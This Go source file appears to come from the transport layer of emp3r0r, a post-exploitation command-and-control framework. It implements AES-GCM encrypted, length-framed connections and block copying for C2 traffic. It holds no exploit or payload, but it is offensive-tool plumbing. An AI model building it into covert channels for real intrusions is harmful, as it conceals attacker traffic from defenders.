package transport

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"net"
	"sync"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

const DefaultC2BlockSize = 32 * 1024

// SecureConn wraps a net.Conn with AES-GCM encryption
type SecureConn struct {
	net.Conn
	key     []byte
	keyMu   sync.RWMutex
	readBuf []byte
	readMu  sync.Mutex
	writeMu sync.Mutex
}

// ByteReadWriteCloser wraps io.ReadWriteCloser to implement net.Conn
// This is a helper to allow wrapping things that aren't strictly net.Conn but act like one
type ByteReadWriteCloser struct {
	io.ReadWriteCloser
}

func (b *ByteReadWriteCloser) LocalAddr() net.Addr                { return nil }
func (b *ByteReadWriteCloser) RemoteAddr() net.Addr               { return nil }
func (b *ByteReadWriteCloser) SetDeadline(t time.Time) error      { return nil }
func (b *ByteReadWriteCloser) SetReadDeadline(t time.Time) error  { return nil }
func (b *ByteReadWriteCloser) SetWriteDeadline(t time.Time) error { return nil }

// NewSecureConn creates a new SecureConn using the global AESPassword if no key is provided
func NewSecureConn(conn io.ReadWriteCloser) *SecureConn {
	// If conn is not a net.Conn, wrap it
	var netConn net.Conn
	var ok bool
	if netConn, ok = conn.(net.Conn); !ok {
		netConn = &ByteReadWriteCloser{conn}
	}

	return &SecureConn{
		Conn:    netConn,
		key:     def.AESPassword, // Use the global key
		readBuf: make([]byte, 0),
	}
}

// SetKey updates the encryption key for the connection.
// This is used to switch to a session key after a successful handshake.
func (sc *SecureConn) SetKey(key []byte) {
	sc.keyMu.Lock()
	defer sc.keyMu.Unlock()
	sc.key = key
}

// Read reads encrypted data from the connection, decrypts it, and returns it.
func (sc *SecureConn) Read(p []byte) (n int, err error) {
	sc.readMu.Lock()
	defer sc.readMu.Unlock()

	// If we have buffered data, return it
	if len(sc.readBuf) > 0 {
		n = copy(p, sc.readBuf)
		sc.readBuf = sc.readBuf[n:]
		return n, nil
	}

	// Read header: 4 bytes length
	header := make([]byte, 4)
	_, err = io.ReadFull(sc.Conn, header)
	if err != nil {
		return 0, err
	}

	// Parse length
	dataLen := int(header[0])<<24 | int(header[1])<<16 | int(header[2])<<8 | int(header[3])

	// Sanity check
	if dataLen <= 0 || dataLen > 10*1024*1024 { // 10MB max chunk
		return 0, fmt.Errorf("read: invalid encrypted chunk length: %d", dataLen)
	}

	// Read encrypted payload
	encryptedData := make([]byte, dataLen)
	_, err = io.ReadFull(sc.Conn, encryptedData)
	if err != nil {
		return 0, err
	}

	// Decrypt
	sc.keyMu.RLock()
	key := sc.key
	sc.keyMu.RUnlock()
	decrypted, err := crypto.AES_GCM_Decrypt(key, encryptedData)
	if err != nil {
		logging.Errorf("SecureConn: decryption failed: %v", err)
		return 0, err
	}

	// Copy to p
	n = copy(p, decrypted)

	// Buffer remaining
	if n < len(decrypted) {
		sc.readBuf = decrypted[n:]
	}

	return n, nil
}

// Write encrypts the data and writes it to the connection with framing.
func (sc *SecureConn) Write(p []byte) (n int, err error) {
	sc.writeMu.Lock()
	defer sc.writeMu.Unlock()

	sc.keyMu.RLock()
	key := sc.key
	sc.keyMu.RUnlock()
	encrypted, err := crypto.AES_GCM_Encrypt(key, p)
	if err != nil {
		return 0, fmt.Errorf("encryption failed: %v", err)
	}

	// Frame: [Len (4 bytes)] [Encrypted Data]
	totalLen := len(encrypted)
	frame := make([]byte, 4+totalLen)

	frame[0] = byte(totalLen >> 24)
	frame[1] = byte(totalLen >> 16)
	frame[2] = byte(totalLen >> 8)
	frame[3] = byte(totalLen)

	copy(frame[4:], encrypted)

	_, err = sc.Conn.Write(frame)
	if err != nil {
		return 0, err
	}

	return len(p), nil
}

// Close closes the connection
func (sc *SecureConn) Close() error {
	return sc.Conn.Close()
}

// CopyC2Blocks copies data in explicit fixed-size blocks over the C2 stream.
// Each Write call is framed by SecureConn, so this enforces deterministic block boundaries.
func CopyC2Blocks(dst io.Writer, src io.Reader, blockSize int) (int64, error) {
	if blockSize <= 0 {
		blockSize = DefaultC2BlockSize
	}

	buf := make([]byte, blockSize)
	var written int64

	for {
		nr, er := src.Read(buf)
		if nr > 0 {
			nw, ew := dst.Write(buf[:nr])
			written += int64(nw)
			if ew != nil {
				return written, ew
			}
			if nw != nr {
				return written, io.ErrShortWrite
			}
		}
		if er != nil {
			if er == io.EOF {
				return written, nil
			}
			return written, er
		}
	}
}

// Helpers for manual Encrypt/Decrypt (used by Preflight)
func Encrypt(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(def.AESPassword)
	if err != nil {
		return nil, err
	}
	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, aesgcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	ciphertext := aesgcm.Seal(nil, nonce, data, nil)
	return append(nonce, ciphertext...), nil
}

func Decrypt(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(def.AESPassword)
	if err != nil {
		return nil, err
	}
	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := aesgcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	return aesgcm.Open(nil, nonce, ciphertext, nil)
}
